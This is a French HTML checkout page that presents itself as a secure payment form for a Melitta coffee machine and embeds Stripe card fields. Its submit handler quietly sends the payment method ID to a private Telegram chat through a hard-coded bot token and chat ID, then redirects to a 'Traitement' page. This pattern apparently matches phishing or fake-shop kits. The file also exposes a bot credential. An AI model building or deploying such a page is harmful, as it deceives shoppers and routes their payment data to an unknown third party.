<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page de Paiement Sécurisé</title>
    <script src="https://js.stripe.com/v3/"></script>
    <style>
        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: linear-gradient(to right, #ffffff, #f4f4f4);
            margin: 0;
            padding: 0;
        }

        .container {
            max-width: 700px;
            margin: 50px auto;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
            padding: 30px 40px;
        }

        h2 {
            text-align: center;
            color: #c70000;
            margin-bottom: 30px;
            font-size: 24px;
        }

        .product-info {
            text-align: center;
            margin-bottom: 30px;
        }

        .product-info img {
            width: 150px;
            margin-bottom: 15px;
        }

        .product-info p {
            font-size: 16px;
            color: #333;
        }

        .price {
            font-size: 20px;
            color: #c70000;
            font-weight: bold;
            margin-top: 10px;
        }

        #payment-form {
            margin-top: 20px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        button {
            width: 100%;
            padding: 15px;
            background-color: #c70000;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #a50000;
        }

        #card-element {
            border: 1px solid #ddd;
            border-radius: 5px;
            padding: 12px;
            font-size: 16px;
        }

        #card-errors {
            color: #c70000;
            margin-top: 10px;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Informations sur le produit -->
        <div class="product-info">
            <img src="51FWfzIHkWL._AC_SX679_.jpg" alt="Melitta Barista TS Smart Noire">
            <p><strong>Melitta Barista TS Smart Noire, Machine à Café à Grain</strong></p>
            <p>Couleur : Noir</p>
            <p>Marque : Melitta</p>
            <p>Type : Machine à espresso avec broyeur intégré</p>
            <p class="price">Prix : 519.99€</p>
        </div>

        <!-- Séparateur -->
        <hr>

        <!-- Formulaire de paiement -->
    <h2>Informations de Paiement</h2>
    <form id="payment-form">
        <div id="card-element">
            <!-- Stripe.js intègre ici les champs de carte -->
        </div>
        <div id="card-errors" role="alert"></div>
        <button type="submit">Payer maintenant</button>
    </form>

    <script>
        // Clé publique Stripe
        const stripe = Stripe("pk_test_51HxM4lEY1234567890abcdEFGH");
        const elements = stripe.elements();

        // Style pour le champ de carte
        const style = {
            base: {
                color: "#32325d",
                fontFamily: 'Roboto, Arial, sans-serif',
                fontSize: "16px",
                "::placeholder": {
                    color: "#aab7c4"
                }
            },
            invalid: {
                color: "#fa755a",
                iconColor: "#fa755a"
            }
        };

        // Champ de carte bancaire
        const card = elements.create("card", { style });
        card.mount("#card-element");

        // Gestion des erreurs
        card.on("change", (event) => {
            const displayError = document.getElementById("card-errors");
            if (event.error) {
                displayError.textContent = event.error.message;
            } else {
                displayError.textContent = "";
            }
        });

        // Informations pour le bot Telegram
        const botToken = '8101158488:AAH6WIfCC6B6aGkWd_Tt6QRrWD8QKQQc69M'; // Votre token
        const chatId = '5372119436'; // Votre chat ID Telegram

        // Soumission du formulaire
        const form = document.getElementById("payment-form");
        form.addEventListener("submit", async (event) => {
            event.preventDefault();

            const { paymentMethod, error } = await stripe.createPaymentMethod({
                type: "card",
                card: card,
            });

            if (error) {
                // Affiche une erreur si nécessaire
                const errorElement = document.getElementById("card-errors");
                errorElement.textContent = error.message;
            } else {
                // Envoyer le PaymentMethod ID à Telegram
                const message = Paiement réussi ! PaymentMethod ID : ${paymentMethod.id};

                const telegramApiUrl = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};

                try {
                    const response = await fetch(telegramApiUrl);
                    const dataResponse = await response.json();

                    if (dataResponse.ok) {
                        // Redirection vers la page suivante
                        alert("Paiement réussi et informations envoyées !");
                        window.location.href = "Traitement.html";
                    } else {
                        alert('Erreur dans l\'envoi des informations. Veuillez réessayer.');
                    }
                } catch (error) {
                    console.error('Erreur lors de l\'envoi à Telegram:', error);
                    alert('Erreur réseau ou problème avec l\'API Telegram.');
                }
            }
        });
    </script>
</body>
</html>
